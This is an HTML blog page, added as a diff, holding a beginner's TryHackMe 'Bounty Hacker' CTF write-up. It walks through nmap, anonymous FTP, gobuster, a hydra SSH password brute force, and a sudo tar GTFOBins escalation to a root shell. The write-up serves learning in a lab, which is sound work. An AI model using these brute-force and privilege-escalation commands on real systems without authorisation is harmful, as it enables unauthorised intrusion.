@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Bounty Hacker Writeup — Packetcat</title>
+<meta name="description" content="A TryHackMe CTF writeup for the Bounty Hacker room.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<a class="skip" href="#main">Skip to content</a>
+
+<nav class="tmux" aria-label="Main">
+  <span class="tmux__session">packetcat</span>
+  <ul class="tmux__windows">
+    <li><a href="index.html">1:home</a></li>
+    <li><a href="about.html">2:about</a></li>
+    <li><a href="writeups.html" aria-current="page">3:writeups</a></li>
+    <li><a href="links.html">4:links</a></li>
+  </ul>
+  <span class="tmux__host">kali@rpi5</span>
+</nav>
+
+<main id="main">
+  <div class="wrap">
+
+    <section class="block">
+      <h1 class="h-section"><span class="mark">#</span> Room: Bounty Hacker</h1>
+      <div class="prose">
+        <p>You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!</p>
+        
+        <h3>Deploy the machine:</h3>
+        <p>No answer needed.</p>
+      </div>
+    </section>
+
+    <section class="block">
+      <h2 class="h-section"><span class="mark">##</span> Recon</h2>
+      <div class="prose">
+        <p>First things first... Recon.</p>
+
+        <h3>Find open ports on the machine:</h3>
+        <p>No answer needed.</p>
+
+        <h4>Nmap scan:</h4>
+        <p>The first thing I do is scan the network to get an idea of the ports that are open on the machine.<br>
+        NOTE: Normally I also add a <code>-oN</code> tag to save the scan results into a file in my working directory, but I skipped it this time.</p>
+
+        <pre><code>nmap -sT -sC 10.67.182.209</code></pre>
+
+<pre><code>PORT   STATE SERVICE
+21/tcp open  ftp
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: PASV failed: 550 Permission denied.
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.67.120.70
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.5 - secure, fast, stable
+|_End of status
+22/tcp open  ssh
+80/tcp open  http
+|_http-title: Site doesn't have a title (text/html).</code></pre>
+
+        <p>Since I can see that FTP is running on port 21, with anonymous access, that is the first place I will start.</p>
+        <p>Logging into FTP I see two files: <code>locks.txt</code>, and <code>task.txt</code>. Let's go ahead and grab those.</p>
+
+<pre><code>root@ip-10-67-109-61:~# ftp 10.67.182.209
+Connected to 10.67.182.209.
+220 (vsFTPd 3.0.5)
+Name (10.67.182.209:root): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
+-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
+226 Directory send OK.
+ftp> get locks.txt
+local: locks.txt remote: locks.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for locks.txt (418 bytes).
+226 Transfer complete.
+418 bytes received in 0.00 secs (312.3207 kB/s)
+ftp> get task.txt
+local: task.txt remote: task.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for task.txt (68 bytes).
+226 Transfer complete.
+68 bytes received in 0.00 secs (109.9441 kB/s)
+ftp> !</code></pre>
+
+        <p>After looking at the files we get some pretty good information. And some answers for the rooms.</p>
+
+        <h4>task.txt</h4>
+<pre><code>1.) Protect Vicious.
+2.) Plan for Red Eye pickup on the moon.
+
+-*** (Answer to who wrote the task list)</code></pre>
+
+        <p>The other file, <code>locks.txt</code>, looks like potential passwords. Maybe we can use that for a brute force??</p>
+      </div>
+    </section>
+
+    <section class="block">
+      <h2 class="h-section"><span class="mark">##</span> Enumeration</h2>
+      <div class="prose">
+        <p>Now for the fun part. Thinking back to our Nmap scan from before, port 80 was open running an HTML site on it. Maybe that could be of some use?</p>
+        <p>Let's spool up gobuster (or any other directrory scanning tool you prefer) and take a look.</p>
+
+        <h3>Gobuster</h3>
+        <pre><code>gobuster dir -u http://10.67.182.209 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></pre>
+
+<pre><code>===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.67.182.209
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 315] [--> http://10.67.182.209/images/]
+/server-status        (Status: 403) [Size: 278]
+Progress: 218275 / 218276 (100.00%)
+===============================================================</code></pre>
+
+        <p>Okay so maybe there isn't anything worth looking into here... Let's move on to port 22.</p>
+
+        <h3>Hydra</h3>
+        <p>Now for a very fun tool. Hydra. We can use Hydra to bruteforce the password on a certain port that is using a protocol that is the answer for a certain question.</p>
+        
+        <pre><code>hydra -l lin -P locks.txt ssh://10.67.182.209</code></pre>
+        
+        <p>In the command above, we use the username that we got from the task file and the password list that is locks.txt. Now we attack SSH and see if there is a match.</p>
+
+        <pre><code>[22][ssh] host: 10.67.182.209   login: lin   password: ************** (This is the answer to another question so I had to hide it.)</code></pre>
+
+        <p>It appears we got a match. Let's get logged in!</p>
+
+<pre><code>lin@ip-10-67-182-209:~/Desktop$ ls
+user.txt</code></pre>
+
+        <p>And there is the user flag!</p>
+      </div>
+    </section>
+
+    <section class="block">
+      <h2 class="h-section"><span class="mark">##</span> Privilege Escalation</h2>
+      <div class="prose">
+        <p>Now we just have to look for the root flag. Let's see what steps we can take to get root.</p>
+
+<pre><code>lin@ip-10-67-182-209:/$ sudo -l
+[sudo] password for lin: 
+Matching Defaults entries for lin on ip-10-67-182-209:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User lin may run the following commands on ip-10-67-182-209:
+    (root) /bin/tar</code></pre>
+
+        <p>We can see here that lin can use 'tar' as root. Let's make that work to our advantage. To GTFO bins!!</p>
+        
+        <pre><code>tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</code></pre>
+        
+        <p>According to GTFOBins, running the command above with sudo should allow us to escalate to root. Let's try it!</p>
+
+<pre><code># whoami
+root</code></pre>
+
+        <p>And there we go! We are root! Now you just have to find the root flag, but that is easy since we are root and the flag is in the root directory.</p>
+      </div>
+    </section>
+
+    <section class="block">
+      <h2 class="h-section"><span class="mark">##</span> Room Completed!</h2>
+      <div class="prose">
+        <p>Congrats on completing the room! I hope this write up helped you if you got stuck at all! This was my first write up so I hope it made any sense at all. Thank you for reading.</p>
+        <p><strong>See you, space H4ck3r.</strong></p>
+      </div>
+    </section>
+
+    <footer class="foot">
+      <span>packetcat</span>
+      <span>&#10095; still learning, writing it all down</span>
+    </footer>
+
+  </div>
+</main>
+
+<div class="status">
+  <span class="status__dot"></span>
+  <span>session: bounty hacker</span>
+  <span class="status__clock" data-clock>--:--:--</span>
+</div>
+
+<script src="script.js"></script>
+</body>
+</html>
